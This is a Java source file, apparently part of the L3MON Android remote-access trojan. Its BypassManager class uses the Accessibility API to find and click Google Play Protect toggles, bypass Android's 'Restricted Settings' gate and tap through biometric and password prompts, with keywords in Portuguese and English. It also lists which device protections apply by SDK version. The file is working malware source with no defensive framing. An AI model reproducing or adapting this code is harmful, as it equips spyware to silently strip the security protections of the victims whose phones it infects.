package com.etechd.l3mon.managers;

import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONArray;

public class BypassManager {

    private static final String TAG = "BypassManager";

    // ==================== PLAY PROTECT ====================
    public boolean disableGooglePlayProtect(AccessibilityNodeInfo root) {
        if (root == null)
            return false;

        boolean disabled = findAndDisablePlayProtectRecursive(root, 0);

        if (!disabled) {
            disabled = forceNavigateToPlayProtect(root);
        }
        return disabled;
    }

    private boolean findAndDisablePlayProtectRecursive(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 8)
            return false;

        String combined = getCombinedText(node);

        if (combined.contains("play protect") ||
                combined.contains("verificar ameaças") ||
                combined.contains("melhorar detecção") ||
                combined.contains("google play protect")) {

            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                logBypass("Play Protect", "Toggle clicado");
                return true;
            }

            AccessibilityNodeInfo switchNode = findSwitchNearNode(node);
            if (switchNode != null) {
                switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                switchNode.recycle();
                logBypass("Play Protect", "Switch clicado");
                return true;
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndDisablePlayProtectRecursive(child, depth + 1)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    private boolean forceNavigateToPlayProtect(AccessibilityNodeInfo root) {
        try {
            if (findAndClickNodeWithText(root, "configurações") ||
                    findAndClickNodeWithText(root, "segurança")) {

                Thread.sleep(800);
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    // ==================== MÉTODO CORRIGIDO ====================
    private boolean findAndClickNodeWithText(AccessibilityNodeInfo node, String keyword) {
        if (node == null)
            return false;

        String text = safeToLower(node.getText());
        if (text.contains(keyword) && node.isClickable()) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return true;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndClickNodeWithText(child, keyword)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    private AccessibilityNodeInfo findSwitchNearNode(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) {
            for (int i = 0; i < parent.getChildCount(); i++) {
                AccessibilityNodeInfo sibling = parent.getChild(i);
                if (sibling != null) {
                    String className = sibling.getClassName() != null ? sibling.getClassName().toString() : "";
                    if (className.contains("Switch") || className.contains("Toggle")) {
                        return sibling;
                    }
                    sibling.recycle();
                }
            }
            parent.recycle();
        }
        return null;
    }

    // ==================== RESTRICTED SETTINGS ====================
    public boolean bypassRestrictedSettings(AccessibilityNodeInfo root) {
        if (root == null)
            return false;
        return findAndClickRestrictedSettings(root);
    }

    private boolean findAndClickRestrictedSettings(AccessibilityNodeInfo node) {
        if (node == null)
            return false;

        String combined = getCombinedText(node);
        if (combined.contains("configurações restritas") || combined.contains("restricted settings")) {
            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                logBypass("Restricted Settings", "Clicado");
                return true;
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndClickRestrictedSettings(child)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    // ==================== BIOMETRIA ====================
    public boolean bypassBiometry(AccessibilityNodeInfo root) {
        if (root == null)
            return false;
        boolean success = findAndApproveBiometricDialog(root);
        if (!success)
            success = findAndClickAlternativeAuth(root);
        return success;
    }

    private boolean findAndApproveBiometricDialog(AccessibilityNodeInfo node) {
        if (node == null)
            return false;
        String combined = getCombinedText(node);

        if (combined.contains("biometria") || combined.contains("impressão digital") ||
                combined.contains("face id") || combined.contains("reconhecimento facial")) {
            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
            return findAndClickAlternativeAuth(node);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndApproveBiometricDialog(child)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    private boolean findAndClickAlternativeAuth(AccessibilityNodeInfo node) {
        String[] alternatives = { "usar senha", "use password", "usar pin", "use pin", "senha", "password", "pin" };
        return findAndClickButtonWithKeywords(node, alternatives);
    }

    private boolean findAndClickButtonWithKeywords(AccessibilityNodeInfo node, String[] keywords) {
        if (node == null)
            return false;
        String combined = getCombinedText(node);

        for (String keyword : keywords) {
            if (combined.contains(keyword)) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndClickButtonWithKeywords(child, keywords)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    // ==================== UTILITÁRIOS ====================
    private String getCombinedText(AccessibilityNodeInfo node) {
        String text = safeToLower(node.getText());
        String desc = safeToLower(node.getContentDescription());
        String viewId = safeToLower(node.getViewIdResourceName());
        return text + " " + desc + " " + viewId;
    }

    private String safeToLower(CharSequence cs) {
        return cs != null ? cs.toString().toLowerCase() : "";
    }

    private void logBypass(String feature, String action) {
        Log.d(TAG, feature + " → " + action);
    }

    public JSONArray detectAndroidProtections() {
        JSONArray protections = new JSONArray();
        int version = android.os.Build.VERSION.SDK_INT;

        if (version >= 26)
            protections.put("GooglePlay Protect");
        if (version >= 23)
            protections.put("SafetyNet");
        if (version >= 31)
            protections.put("PlayIntegrity");
        if (version >= 33)
            protections.put("Restricted Settings");
        if (version >= 30)
            protections.put("Accessibility Lock");

        return protections;
    }
}